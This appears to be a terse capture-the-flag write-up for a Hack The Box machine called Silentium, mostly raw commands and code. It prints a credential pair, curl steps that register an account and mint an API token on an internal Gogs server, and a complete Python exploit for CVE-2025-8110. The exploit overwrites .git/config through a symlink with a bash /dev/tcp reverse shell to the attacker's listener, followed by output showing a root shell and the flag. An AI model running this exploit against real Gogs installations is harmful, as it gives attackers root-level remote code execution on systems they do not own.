
it have subdomain staging.silentium.htb

```
Nmap scan report for 10.129.31.50 (10.129.31.50)  
Host is up (0.14s latency).  
Not shown: 998 closed tcp ports (conn-refused)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)  
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)  
80/tcp open  http    nginx 1.24.0 (Ubuntu)  
|_http-server-header: nginx/1.24.0 (Ubuntu)  
|_http-title: Did not follow redirect to http://silentium.htb/  
| http-methods:   
|_  Supported Methods: GET HEAD POST OPTIONS
```


```
ben: r04D!!_R4ge
```

```
ajdev@rootbox:~$ curl -s \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  http://127.0.0.1:3001/user/sign_up \
  -c /tmp/cookies.txt > /tmp/signup.html
ajdev@rootbox:~$ CSRF=$(grep -oP 'name="_csrf" value="\K[^"]+' /tmp/signup.html | head -1)

CAPTCHA_ID=$(grep -oP 'name="captcha_id" value="\K[^"]+' /tmp/signup.html | head -1)

echo $CSRF
echo $CAPTCHA_ID
yf6WmYWdTp_a_dNA_fSatN8QIWg6MTc3NjI0Nzg1MjU4OTYwNTc4MA
H0p7bLR593ZjP0N
ajdev@rootbox:~$ curl -s \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -b /tmp/cookies.txt \
  "http://127.0.0.1:3001/captcha/H0p7bLR593ZjP0N.png" \
  -o /tmp/captcha.png
ajdev@rootbox:~$ open /tmp/captcha.png
ajdev@rootbox:~$ 033998
033998: command not found
ajdev@rootbox:~$ curl -i -s -X POST \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -b /tmp/cookies.txt -c /tmp/cookies.txt \
  --data-urlencode "_csrf=yf6WmYWdTp_a_dNA_fSatN8QIWg6MTc3NjI0Nzg1MjU4OTYwNTc4MA" \
  --data-urlencode "user_name=hacker" \
  --data-urlencode "email=hacker@test.com" \
  --data-urlencode "password=Hacker123!" \
  --data-urlencode "retype=Hacker123!" \
  --data-urlencode "captcha_id=H0p7bLR593ZjP0N" \
  --data-urlencode "captcha=033998" \
  http://127.0.0.1:3001/user/sign_up
HTTP/1.1 302 Found
Location: /user/login
X-Content-Type-Options: nosniff
X-Frame-Options: deny
Date: Wed, 15 Apr 2026 10:12:38 GMT
Content-Length: 0

ajdev@rootbox:~$ curl -s -X POST \
  -H "Host: staging-v2-code.dev.silentium.htb" \
  -H "Content-Type: application/json" \
  "http://127.0.0.1:3001/api/v1/users/hacker/tokens" \
  -u "hacker:Hacker123!" \
  -d '{"name":"exploit"}'
{"name":"exploit","sha1":"64d8e2232cf6fb28743634f4866012f46d362b47"}
```

```
import requests
import subprocess
import tempfile
import os
import sys
import base64
import argparse

def main():
    parser = argparse.ArgumentParser(description='CVE-2025-8110 Gogs RCE')
    parser.add_argument('-u', '--url', required=True, help='Gogs URL')
    parser.add_argument('-lh', '--lhost', required=True, help='Listener host')
    parser.add_argument('-lp', '--lport', required=True, help='Listener port')
    parser.add_argument('--username', default='hacker')
    parser.add_argument('--password', default='Hacker123!')
    parser.add_argument('--token', default=None, help='Gogs API token')
    args = parser.parse_args()

    GOGS_URL = args.url.rstrip('/')
    HOST = "staging-v2-code.dev.silentium.htb"
    REPO = "pwn-repo"

    s = requests.Session()
    s.headers.update({"Host": HOST})

    # Authenticate
    if not args.token:
        r = s.post(f"{GOGS_URL}/api/v1/users/{args.username}/tokens",
                    auth=(args.username, args.password),
                    json={"name": "pwn-token"})
        token = r.json()["sha1"]
    else:
        token = args.token

    print(f"[+] Authenticated successfully")
    print(f"[+] Application token: {token}")
    s.headers.update({"Authorization": f"token {token}"})

    # Create repo
    r = s.post(f"{GOGS_URL}/api/v1/user/repos",
               json={"name": REPO, "private": False, "auto_init": False})
    print(f"    Repo creation status: {r.status_code}")

    # Build local repo with symlink
    work = tempfile.mkdtemp()
    os.chdir(work)
    subprocess.run(["git", "init"], capture_output=True)
    subprocess.run(["git", "config", "user.email", "h@h.com"], capture_output=True)
    subprocess.run(["git", "config", "user.name", "h"], capture_output=True)

    os.symlink(".git/config", os.path.join(work, "symlink"))
    open(os.path.join(work, "README.md"), "w").write("x\n")
    subprocess.run(["git", "add", "-A"], capture_output=True)
    subprocess.run(["git", "commit", "-m", "init"], capture_output=True)

    push_url = f"http://{args.username}:{args.password}@127.0.0.1:3001/{args.username}/{REPO}.git"
    subprocess.run(["git", "push", push_url, "master", "--force"],
                   capture_output=True, env={**os.environ, "GIT_TERMINAL_PROMPT": "0"})
    print("[+] Symlink pushed")

    # Get file SHA
    r = s.get(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink")
    sha = r.json()["sha"]

    # Malicious .git/config with reverse shell sshCommand
    config = f"""[core]
\trepositoryformatversion = 0
\tfilemode = true
\tbare = false
\tsshCommand = bash -c 'bash -i >& /dev/tcp/{args.lhost}/{args.lport} 0>&1'
[remote "origin"]
\turl = ssh://localhost/x
\tfetch = +refs/heads/*:refs/remotes/origin/*
[branch "master"]
\tremote = origin
\tmerge = refs/heads/master
"""

    # Overwrite .git/config via symlink
    r = s.put(f"{GOGS_URL}/api/v1/repos/{args.username}/{REPO}/contents/symlink",
              json={"content": base64.b64encode(config.encode()).decode(),
                    "message": "update", "sha": sha})
    print(f"[+] Exploit sent, check your listener!")

if __name__ == "__main__":
    main()
```

```
ajdev@rootbox:~/HTB$ python3 exploit.py   -u http://localhost:3001   -lh 10.10.15.133   -lp 9001   --token 64d8e2232cf6fb28743634f4866012f46d362b47
[+] Authenticated successfully
[+] Application token: 64d8e2232cf6fb28743634f4866012f46d362b47
    Repo creation status: 201
[+] Symlink pushed
[+] Exploit sent, check your listener!
```

```
ajdev@rootbox:~$ nc -lvnp 9001
Listening on 0.0.0.0 9001
Connection received on 10.129.32.216 56674
bash: cannot set terminal process group (1529): Inappropriate ioctl for device
bash: no job control in this shell
root@silentium:/opt/gogs/gogs/data/tmp/local-repo/1# whoami
whoami
root
root@silentium:/home# cd /root
cd /root
root@silentium:~# ls
ls
gogs-repositories
root.txt
root@silentium:~# cat root.txt
cat root.txt
9535d1a27a4d31898655a5df6e1b4f1e
```
